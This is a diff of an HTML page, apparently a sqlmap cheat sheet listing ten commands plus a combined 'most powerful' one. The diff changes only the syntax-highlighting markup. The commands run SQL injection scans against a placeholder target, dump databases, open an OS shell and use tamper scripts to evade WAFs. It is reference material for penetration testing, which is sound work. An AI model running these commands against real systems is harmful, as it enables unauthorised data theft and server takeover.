@@ -126,58 +126,58 @@
 <p><strong>Sqlmap</strong> is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Basic Scan</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com/vuln.php?id=1&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com/vuln.php?id=1&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> The standard scan against a URL with parameters.</p>
 <h3>2. Auto-Accept Defaults</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --batch
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--batch
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Never ask for user input (<code>--batch</code>), use default behavior. unique for automation.</p>
 <h3>3. POST Request (Saved File)</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -r request.txt --batch
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt<span class="w"> </span>--batch
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Load a raw HTTP request from a file (<code>-r</code>). Best way to scan POST forms.</p>
 <h3>4. Dump Database</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --dump
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--dump
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Dump the database data entries.</p>
 <h3>5. List Booty</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --dbs --tables --columns
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--dbs<span class="w"> </span>--tables<span class="w"> </span>--columns
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Enumerate Databases (<code>--dbs</code>), Tables (<code>--tables</code>), or Columns (<code>--columns</code>).</p>
 <h3>6. OS Shell</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --os-shell
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--os-shell
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Prompt for an interactive operating system shell (requires DBA privileges usually).</p>
 <h3>7. Random Agent</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --random-agent
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--random-agent
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Use a random User-Agent header.</p>
 <h3>8. Crawl</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com&quot; --crawl=1
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com&quot;</span><span class="w"> </span>--crawl<span class="o">=</span><span class="m">1</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Crawl the site to find injection points automatically.</p>
 <h3>9. Tamper Scripts</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --tamper=&quot;space2comment&quot;
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2comment&quot;</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Use scripts to obfuscate the payload to bypass WAFs.</p>
 <h3>10. Level &amp; Risk</h3>
-<pre class="codehilite"><code class="language-bash">sqlmap -u &quot;http://target.com?id=1&quot; --level=5 --risk=3
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target.com?id=1&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> <code>Level 5</code> tests all headers (Cookie, Referer). <code>Risk 3</code> uses heavy payloads (OR-based) that might be noisy.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=between,space2comment --threads=10 --dump
-</code></pre>
+<div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>-r<span class="w"> </span>request.txt<span class="w"> </span>--batch<span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--tamper<span class="o">=</span>between,space2comment<span class="w"> </span>--threads<span class="o">=</span><span class="m">10</span><span class="w"> </span>--dump
+</code></pre></div>
 
 <p><strong>Explanation:</strong> High-intensity scan using a captured request, aggressive testing levels, WAF evasion scripts, and multi-threading to dump data.</p>
         </div>
